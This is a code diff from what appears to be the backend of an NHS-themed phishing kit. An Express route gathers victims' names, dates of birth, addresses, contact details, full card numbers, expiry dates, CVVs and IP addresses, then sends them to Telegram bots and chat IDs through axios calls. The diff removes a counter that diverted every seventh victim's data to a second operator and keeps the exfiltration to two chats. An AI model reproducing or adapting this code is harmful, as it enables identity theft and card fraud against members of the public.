@@ -2440,20 +2440,13 @@ app.post("/spoofergooferNHS", (req, res) => {
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
       var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
-      if (Spoofergoofer == 7) {
-        axios.post(
-          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
-        );
-        Spoofergoofer = 0;
-      } else {
-        axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSSpooferGoofer:\n${originalText}`
-        );
-        axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=993063133&text=NHS:\n${originalText}`
-        );
-        Spoofergoofer += 1;
-      }
+
+      axios.post(
+        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSSpooferGoofer:\n${originalText}`
+      );
+      axios.post(
+        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=993063133&text=NHS:\n${originalText}`
+      );
 
       res.send("Update Completed");
     });
